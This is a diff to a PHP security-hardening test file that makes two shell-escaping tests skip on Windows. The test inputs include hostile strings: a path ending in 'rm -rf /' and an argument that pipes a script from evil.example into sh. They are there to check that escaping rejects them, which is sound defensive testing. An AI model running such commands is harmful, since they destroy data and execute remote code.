@@ -243,6 +243,8 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     #[\PHPUnit\Framework\Attributes\TestDox('SEC-05 — Executable path that contains shell metacharacters is rejected')]
     public function testSec05ShellExecutablePathRejectsMetacharacters(): void
     {
+        if ( PHP_OS_FAMILY === 'Windows' )
+            $this->markTestSkipped( 'escapeshellcmd() and escapeshellarg() quote for cmd.exe on Windows, not for a POSIX shell' );
         // The patch validates executable path with a strict regex or escapeshellcmd()
         $malicious = '/usr/bin/convert; rm -rf /';
 
@@ -271,6 +273,8 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     #[\PHPUnit\Framework\Attributes\TestDox('SEC-05 — Arguments passed to shell handler are individually escaped')]
     public function testSec05ShellArgumentsEscaped(): void
     {
+        if ( PHP_OS_FAMILY === 'Windows' )
+            $this->markTestSkipped( 'escapeshellcmd() and escapeshellarg() quote for cmd.exe on Windows, not for a POSIX shell' );
         $malicious = '-resize 800x600$(curl http://evil.example/payload.sh|sh)';
 
         $safe = escapeshellarg( $malicious );
